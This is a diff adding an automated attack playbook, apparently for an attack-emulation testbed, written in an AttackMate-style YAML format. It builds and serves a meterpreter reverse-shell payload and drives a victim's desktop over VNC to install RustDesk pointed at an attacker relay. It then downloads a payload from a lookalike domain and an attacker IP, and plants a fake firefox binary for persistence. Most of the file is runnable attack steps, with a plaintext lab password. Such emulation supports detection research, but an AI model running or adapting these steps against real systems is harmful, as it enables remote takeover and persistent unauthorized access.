@@ -1,0 +1,796 @@
+# Client is persuaded by attacker to download and setup rustdesk screensharing 
+# attacker executes commands on client machine via screensharing to download and executes meterpreter payload
+# persistence via browser binary
+
+vars:
+  PAYLOAD: linux/x64/meterpreter/reverse_tcp
+  LPORT: 4443
+  ATTACKMATE_IP: 192.42.1.174
+  CLIENT_IP: 192.168.50.100
+  MGMT_IP: 192.42.0.201
+  MGMT_USERNAME: aecid
+  CLIENT_VNC_PORT: 5900
+  CLIENT_VNC_USER: judy
+  CLIENT_VNC_PASSWORD: garland
+  ATTACKER_VNC_PORT: 5901
+  RUSTDESK_PACKAGE: https://github.com/rustdesk/rustdesk/releases/download/1.3.8/rustdesk-1.3.8-x86_64.deb
+
+
+commands:
+  # establish ssh tunneling via mgmt host, everything sent to attacker port 5902 will be forwarded to client port 5901 (vnc)
+  # ssh -i /home/aecid/.ssh/attacker -o StrictHostKeyChecking=no -L 5902:192.168.50.100:5901 aecid@192.42.0.201
+
+
+##################### SSH TUNNEL VIA MGMT HOST ############################
+
+  - type: shell
+    interactive: true
+    creates_session: tunnel
+    cmd: "ssh -i /home/aecid/.ssh/attacker  -o StrictHostKeyChecking=no -L 5902:$CLIENT_IP:$CLIENT_VNC_PORT $MGMT_USERNAME@$MGMT_IP \n"
+
+
+
+################### SERVE THE FAKE EXECUTABLE ############################
+
+  # serve payload via http
+  - type: webserv
+    local_path: /home/aecid/firefox-startup
+    port: 8082
+    background: True
+
+  - type: sleep
+    seconds: 3
+
+
+
+  # tempfile for reverse shell payload
+  - type: mktemp
+    cmd: file
+    variable: RSHELL
+  
+  # generate reverse shell
+  - type: shell
+    cmd: msfvenom -p $PAYLOAD LHOST=$ATTACKMATE_IP LPORT=$LPORT -f elf > ${RSHELL}
+  
+  # serve payload via http
+  - type: webserv
+    local_path: $RSHELL
+    port: 8080
+    background: True
+
+  # prepare reverse-shell-listener
+  - type: msf-module
+    creates_session: revshell
+    cmd: exploit/multi/handler
+    payload: $PAYLOAD
+    payload_options:
+      LHOST: $ATTACKMATE_IP
+      LPORT: $LPORT
+    background: true
+    kill_on_exit: true
+
+##################### SOCIAL ENGINEERING ON CLIENT ############################
+
+  - type: vnc
+    cmd: capture
+    filename: initial_screenshot.png
+    hostname: localhost
+    port: 5902
+    creates_session: social_engineering
+
+# Opening a terminal from the menu
+
+  - type: vnc
+    cmd: move
+    x: 5
+    y: 5
+    session: social_engineering
+
+  - type: vnc
+    cmd: click
+    session: social_engineering
+
+  - type: sleep
+    seconds: 3
+
+  - type: vnc
+    cmd: type
+    input: "terminal"
+    session: social_engineering
+    
+  - type: sleep
+    seconds: 3
+
+  - type: vnc
+    cmd: key
+    key: "enter"
+    session: social_engineering
+
+  - type: sleep
+    seconds: 3
+
+  - type: vnc 
+    cmd: type 
+    input: "sudo wget -O rustdesk.deb -e use_proxy=yes -e https_proxy=https://192.168.50.254:3128 https://github.com/rustdesk/rustdesk/releases/download/1.3.8/rustdesk-1.3.8-x86_64.deb"
+    session: social_engineering
+
+  - type: sleep
+    seconds: 2
+
+  - type: vnc
+    cmd: key
+    key: "enter"
+    session: social_engineering
+
+  - type: sleep
+    seconds: 45
+
+  - type: vnc 
+    cmd: type 
+    input: "sudo apt install -fy ./rustdesk.deb"
+    session: social_engineering
+
+  - type: vnc
+    cmd: key
+    key: "enter"
+    session: social_engineering
+  
+  - type: sleep
+    seconds: 45
+
+  - type: vnc
+    cmd: type
+    input: "sudo rustdesk --password password"
+    session: social_engineering
+
+  - type: sleep
+    seconds: 2
+
+  - type: vnc
+    cmd: key
+    key: "enter"
+    session: social_engineering
+
+  - type: sleep
+    seconds: 10
+
+# start rustdesk
+  - type: vnc
+    cmd: type
+    input: "rustdesk"
+    session: social_engineering
+
+  - type: sleep
+    seconds: 2
+
+  - type: vnc
+    cmd: key
+    key: "enter"
+    session: social_engineering
+
+  - type: sleep
+    seconds: 2
+
+# option menu
+  - type: vnc
+    cmd: move
+    x: 167
+    y: 188
+    session: social_engineering
+
+  - type: sleep
+    seconds: 1
+
+  - type: vnc
+    cmd: click
+    session: social_engineering
+
+  - type: sleep
+    seconds: 1
+
+# network
+  - type: vnc
+    cmd: move
+    x: 82
+    y: 272
+    session: social_engineering
+
+  - type: vnc
+    cmd: click
+    session: social_engineering
+
+  - type: sleep
+    seconds: 1
+
+# unlock network settings
+  - type: vnc
+    cmd: move
+    x: 468
+    y: 131
+    session: social_engineering
+
+  - type: vnc
+    cmd: click
+    session: social_engineering
+
+  - type: sleep
+    seconds: 1
+
+# enter password
+
+  - type: vnc
+    cmd: type
+    input: "garland"
+    session: social_engineering
+    
+  - type: sleep
+    seconds: 2
+
+  - type: vnc
+    cmd: key
+    key: "enter"
+    session: social_engineering
+
+  - type: sleep
+    seconds: 2
+
+# id relay server
+  - type: vnc
+    cmd: move
+    x: 268
+    y: 182
+    session: social_engineering
+
+  - type: vnc
+    cmd: click
+    session: social_engineering
+
+  - type: sleep
+    seconds: 1
+
+# Enter id server IP
+  - type: vnc
+    cmd: type
+    input: $ATTACKMATE_IP
+    session: social_engineering
+
+  - type: sleep
+    seconds: 1
+
+# click ok
+  - type: vnc
+    cmd: move
+    x: 621
+    y: 490
+    session: social_engineering
+
+  - type: vnc
+    cmd: click
+    session: social_engineering
+
+  - type: sleep
+    seconds: 1
+
+# open a fresh terminal
+
+# Opening a new terminal from the menu in the client that the attacker will be able to use
+
+  - type: vnc
+    cmd: move
+    x: 5
+    y: 5
+    session: social_engineering
+
+  - type: vnc
+    cmd: click
+    session: social_engineering
+
+  - type: sleep
+    seconds: 3
+
+  - type: vnc
+    cmd: type
+    input: "terminal"
+    session: social_engineering
+    
+  - type: sleep
+    seconds: 3
+
+  - type: vnc
+    cmd: key
+    key: "enter"
+    session: social_engineering
+
+  - type: sleep
+    seconds: 3
+
+  
+##################### ATTACKER CONFIGURES THEIR RUSTDESK CLIENT ############################
+
+# connect to attacker screen
+  - type: vnc
+    cmd: capture
+    filename: initial_screenshot.png
+    hostname: localhost
+    port: 5900
+    creates_session: attacker
+
+# Opening a terminal from the menu
+
+  - type: vnc
+    cmd: move
+    x: 5
+    y: 5
+    session: attacker
+
+  - type: vnc
+    cmd: click
+    session: attacker
+
+  - type: sleep
+    seconds: 10
+
+  - type: vnc
+    cmd: type
+    input: "terminal"
+    session: attacker
+    
+  - type: sleep
+    seconds: 10
+
+  - type: vnc
+    cmd: key
+    key: "enter"
+    session: attacker
+
+  - type: sleep
+    seconds: 10
+
+  - type: shell
+    cmd: grep 'update_pk' /var/log/rustdesk/signalserver.log | awk '{last=$7} END{print last}'
+
+  - type: setvar
+    cmd: $RESULT_STDOUT
+    variable: CLIENT_RUSTDESK_ID
+
+  - type: shell
+    cmd: cat rustdesk_public_key.txt
+
+  - type: setvar
+    cmd: $RESULT_STDOUT
+    variable: RUSTDESK_KEY
+
+  - type: sleep
+    seconds: 2
+
+  - type: vnc
+    cmd: type
+    input: "rustdesk"
+    session: attacker
+
+  - type: sleep
+    seconds: 2
+
+  - type: vnc
+    cmd: key
+    key: "enter"
+    session: attacker
+
+  - type: sleep
+    seconds: 10
+
+# enter the attacker ID in the rustdesk client on the attacker machine
+
+# option menu
+  - type: vnc
+    cmd: move
+    x: 167
+    y: 188
+    session: attacker
+
+  - type: sleep
+    seconds: 1
+
+  - type: vnc
+    cmd: click
+    session: attacker
+
+  - type: sleep
+    seconds: 1
+
+# network
+  - type: vnc
+    cmd: move
+    x: 82
+    y: 272
+    session: attacker
+
+  - type: vnc
+    cmd: click
+    session: attacker
+
+  - type: sleep
+    seconds: 1
+
+# unlock network settings
+  - type: vnc
+    cmd: move
+    x: 468
+    y: 131
+    session: attacker
+
+  - type: vnc
+    cmd: click
+    session: attacker
+
+  - type: sleep
+    seconds: 1
+
+  - type: vnc
+    cmd: type
+    input: "aecid"
+    session: attacker
+    
+  - type: sleep
+    seconds: 2
+
+  - type: vnc
+    cmd: key
+    key: "enter"
+    session: attacker
+
+  - type: sleep
+    seconds: 2
+
+# id relay server
+  - type: vnc
+    cmd: move
+    x: 351
+    y: 182
+    session: attacker
+
+  - type: vnc
+    cmd: click
+    session: attacker
+
+  - type: sleep
+    seconds: 5
+
+# Enter id server IP
+  - type: vnc
+    cmd: type
+    input: $ATTACKMATE_IP
+    session: attacker
+
+  - type: sleep
+    seconds: 5
+
+# Key Field
+  - type: vnc
+    cmd: move
+    x: 334
+    y: 439
+    session: attacker
+
+  - type: vnc
+    cmd: click
+    session: attacker
+
+  - type: sleep
+    seconds: 5
+
+# Enter key
+  - type: vnc
+    cmd: type
+    input: $RUSTDESK_KEY
+    session: attacker
+
+  - type: sleep
+    seconds: 5
+
+# click ok
+  - type: vnc
+    cmd: move
+    x: 621
+    y: 490
+    session: attacker
+
+  - type: vnc
+    cmd: click
+    session: attacker
+
+  - type: sleep
+    seconds: 5
+
+##################### ATTACKER CONNECTS TO CLIENT WITH RUSTDESK ############################
+
+# Opening a terminal from the menu
+
+  - type: vnc
+    cmd: move
+    x: 5
+    y: 5
+    session: attacker
+
+  - type: vnc
+    cmd: click
+    session: attacker
+
+  - type: sleep
+    seconds: 7
+
+  - type: vnc
+    cmd: type
+    input: "terminal"
+    session: attacker
+    
+  - type: sleep
+    seconds: 7
+
+  - type: vnc
+    cmd: key
+    key: "enter"
+    session: attacker
+
+  - type: sleep
+    seconds: 7
+
+ # open rustdesk with client id and client  from the terminal
+  - type: vnc 
+    cmd: type 
+    input: "rustdesk --connect $CLIENT_RUSTDESK_ID -p password"
+    session: attacker
+
+  - type: sleep
+    seconds: 3
+
+  - type: vnc
+    cmd: key
+    key: "enter"
+    session: attacker
+
+  - type: sleep
+    seconds: 20
+
+## accept connection on the client side
+
+  - type: vnc
+    cmd: move
+    x: 802
+    y: 489
+    session: social_engineering
+
+  - type: sleep
+    seconds: 3
+
+  - type: vnc
+    cmd: click
+    session: social_engineering
+
+  - type: sleep
+    seconds: 5
+
+## attackers interactions via screenshares on the client desktop
+# select the vnc tab
+
+  - type: vnc
+    cmd: move
+    x: 581
+    y: 754
+    session: attacker
+
+  - type: sleep
+    seconds: 3
+
+  - type: vnc
+    cmd: click
+    session: attacker
+
+  - type: sleep
+    seconds: 5
+
+# click into the open client terminal on the client screen
+
+
+  - type: vnc
+    cmd: move
+    x: 200
+    y: 200
+    session: attacker
+
+  - type: sleep
+    seconds: 3
+
+  - type: vnc
+    cmd: click
+    session: attacker
+
+  - type: sleep
+    seconds: 5
+# download fake install script
+
+  - type: vnc
+    cmd: type
+    input: "curl -o /tmp/index facebock.com:8080/index"
+    session: attacker
+    
+  - type: sleep
+    seconds: 1
+
+  - type: vnc
+    cmd: key
+    key: "enter"
+    session: attacker
+
+  - type: sleep
+    seconds: 10
+
+# make it executable
+  - type: vnc
+    cmd: type
+    input: "sudo chmod +x /tmp/index"
+    session: attacker
+    
+  - type: sleep
+    seconds: 1
+
+  - type: vnc
+    cmd: key
+    key: "enter"
+    session: attacker
+
+  - type: sleep
+    seconds: 1
+
+#### Persistence OPTION B set up a fake firefox binary that executes the reverse shell and then the actual firefox
+## change the symlink in .local/bin from the actual firefox to the fake firefox binary
+
+  - type: vnc
+    cmd: type
+    input: "ln -sf /home/judy/.local/share/firefox/firefox-startup /home/judy/.local/bin/firefox"
+    session: attacker
+
+  - type: sleep
+    seconds: 1
+
+  - type: vnc
+    cmd: key
+    key: "enter"
+    session: attacker
+
+  - type: sleep
+    seconds: 3
+
+## download the fake executable from attacker webserver
+
+  - type: vnc
+    cmd: type
+    input: "curl -o /home/judy/.local/share/firefox/firefox-startup 192.42.1.174:8082/index"
+    session: attacker
+
+  - type: sleep
+    seconds: 1
+
+  - type: vnc
+    cmd: key
+    key: "enter"
+    session: attacker
+
+## make it executable
+  - type: vnc
+    cmd: type
+    input: "chmod +x /home/judy/.local/share/firefox/firefox-startup"
+    session: attacker
+
+  - type: sleep
+    seconds: 1
+
+  - type: vnc
+    cmd: key
+    key: "enter"
+    session: attacker
+
+  - type: sleep
+    seconds: 3
+
+## execute firefox 
+  - type: vnc
+    cmd: type
+    input: "firefox"
+    session: attacker
+
+  - type: sleep
+    seconds: 1
+
+  - type: vnc
+    cmd: key
+    key: "enter"
+    session: attacker
+
+  - type: sleep
+    seconds: 3
+
+## execute the script
+#  - type: vnc
+#    cmd: type
+#    input: "/tmp/index &"
+#    session: attacker
+#    
+#  - type: sleep
+#    seconds: 1
+#
+#  - type: vnc
+#    cmd: key
+#    key: "enter"
+#    session: attacker
+#
+#  - type: sleep
+#    seconds: 3
+#
+
+  - type: debug
+    seconds: execute fake firefox
+
+  # run commands via reverse shell
+  - type: msf-session
+    stdapi: true
+    session: revshell
+    cmd: sysinfo
+
+
+  # vnc connect to client via tunnel (this is "client is instructed via phone"), take screenshot
+
+  # open terminal and download rust desk package, make executable, install
+
+  # expect screens that prompt user interaction during install process + enter options (1 and 2, then press any key)
+
+  # set rustdesk password
+
+  # start rustdesk
+
+  # somehow configure via gui to use attacker IP as server ID
+
+  # get client id from rustdesk server log on attacker. regex?
+
+  # via shell command start connection from attacker machine with retrieved id and set password
+
+  # vnc connect attacker on its own screen that should now show the clients screen, open terminal, run command to download (facebock.com), make executable and execute install.sh metasploit script
+
+  # use established meterpreter session
+
+# Meterpreter in a Nutshell
+#  # tempfile for reverse shell payload
+#  - type: mktemp
+#    cmd: file
+#    variable: RSHELL
+#  
+#  # generate reverse shell
+#  - type: shell
+#    cmd: msfvenom -p $PAYLOAD LHOST=$ATTACKMATE_IP LPORT=$LPORT -f elf > ${RSHELL}
+#  
+#  # serve payload via http
+#  - type: webserv
+#    local_path: $RSHELL
+#    port: 8080
+#    background: True
+#
+#  # prepare reverse-shell-listener
+#  - type: msf-module
+#    creates_session: revshell
+#    cmd: exploit/multi/handler
+#    payload: $PAYLOAD
+#    payload_options:
+#      LHOST: $ATTACKMATE_IP
+#      LPORT: $LPORT
+#    background: true
+#    kill_on_exit: true
+#
+#  # run commands via reverse shell
+#  - type: msf-session
+#    stdapi: true
+#    session: revshell
+#    cmd: sysinfo
+
+
+
+  
